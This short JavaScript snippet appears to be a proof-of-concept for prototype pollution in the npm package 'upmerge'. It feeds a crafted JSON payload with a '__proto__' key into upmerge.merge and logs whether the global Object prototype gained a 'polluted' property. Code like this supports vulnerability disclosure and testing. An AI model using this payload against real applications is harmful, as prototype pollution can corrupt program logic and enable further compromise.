var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
let upmerge = require('upmerge');
let payload = '{"__proto__":{ "polluted" : "yes" } }';
obj = {};
console.log({}.polluted);
upmerge.merge(obj, JSON.parse(payload));
console.log({}.polluted);